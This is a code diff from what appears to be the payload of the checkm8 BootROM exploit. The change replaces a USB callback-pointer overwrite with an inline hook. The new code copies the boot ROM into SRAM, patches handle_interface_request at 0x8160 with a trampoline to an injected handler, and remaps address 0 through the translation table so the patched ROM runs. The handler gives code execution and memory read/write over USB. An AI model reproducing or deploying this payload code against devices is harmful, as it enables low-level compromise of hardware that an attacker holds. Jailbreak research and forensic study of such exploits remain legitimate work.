@@ -128,15 +128,33 @@ __attribute__((noinline)) void demote(void)
 
 __attribute__((noinline)) void copy_checkm8_payload(void)
 {
-    // Copy the usb_0xA1_2 handler (with thumb trampoline prefix) to
-    // JUMP_PAYLOAD_BASE. The handler intercepts USB 0xA1 requests to
-    // provide exec/memcpy/memset over USB, forwarding all other requests
-    // to the original ROM handler via the trampoline in its first 8 bytes.
+    // Copy ROM into SRAM so we can patch it.
+    my_bcopy(VROM_BASE_ADDRESS, LOAD_ADDRESS, 0x10000);
+
+    // Copy the handler to JUMP_PAYLOAD_BASE.
     my_bcopy((uint32_t)handler_bin, JUMP_PAYLOAD_BASE, handler_bin_len);
 
-    // Ensure handler code is visible to the instruction fetch unit.
-    // my_bcopy writes to D-cache; without flushing, the I-cache has stale
-    // data and the CPU would execute garbage when the handler is called.
+    // --- Inline hook at handle_interface_request (ROM 0x8160) ---
+    //
+    // We overwrite the first 8 bytes of the function with a branch to
+    // our handler.  The handler's 16-byte trampoline replays the saved
+    // original instructions and resumes at 0x8168 for non-0xA1 requests.
+    uint32_t *hook_site  = (uint32_t *)(LOAD_ADDRESS + 0x8160);
+    uint32_t *trampoline = (uint32_t *)JUMP_PAYLOAD_BASE;
+
+    // Bytes 0..7: save original instructions into trampoline
+    trampoline[0] = hook_site[0];   // push {r4,r5,r7,lr}; add r7,sp,#8
+    trampoline[1] = hook_site[1];   // ldrb r3,[r0,#7]; ldrb r2,[r0,#6]
+    // Bytes 8..15: LDR.W PC,[PC] + resume address (0x8168 | Thumb bit)
+    trampoline[2] = 0xF000F8DF;
+    trampoline[3] = 0x00008169;
+
+    // Patch hook site: LDR.W PC,[PC] + handler entry
+    // Handler entry = JUMP_PAYLOAD_BASE + 0x11 (16-byte trampoline + Thumb)
+    hook_site[0] = 0xF000F8DF;
+    hook_site[1] = JUMP_PAYLOAD_BASE + 0x11;
+
+    // Flush caches so patched code is visible to instruction fetch.
     asm volatile(
         "dsb\n"
         "mov r0, #0\n"
@@ -146,11 +164,12 @@ __attribute__((noinline)) void copy_checkm8_payload(void)
         ::: "r0", "memory"
     );
 
-    // Set the USB device I/O callback pointer to the handler's entry point.
-    // The first 8 bytes are the trampoline to the original handler;
-    // executable code starts at offset +8, with +1 for Thumb mode = +0x9.
-    uint32_t* callbackPtr = (uint32_t*)USB_DEVICE_IO_CALLBACK;
-    *callbackPtr = JUMP_PAYLOAD_BASE + 0x9;
+    // Remap virtual address 0 to the SRAM copy via TTB.
+    // This makes the patched ROM code execute in place of the original.
+    uint32_t *ttbr0 = (uint32_t *)TTBR0_BASE;
+    ttbr0[0] = 0x10000c1e;
+    arm_write_ttb(TTBR0_BASE);
+    arm_flush_tlbs();
 }
 
 __attribute__((noinline)) int main_payload(void)
